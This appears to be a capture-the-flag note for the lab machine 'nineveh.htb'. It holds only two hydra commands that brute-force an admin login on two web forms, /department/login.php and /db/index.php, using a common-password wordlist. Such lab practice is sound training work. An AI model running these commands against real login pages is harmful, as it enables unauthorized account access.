```bash
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid password" -T 64


hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -k -T 64

```
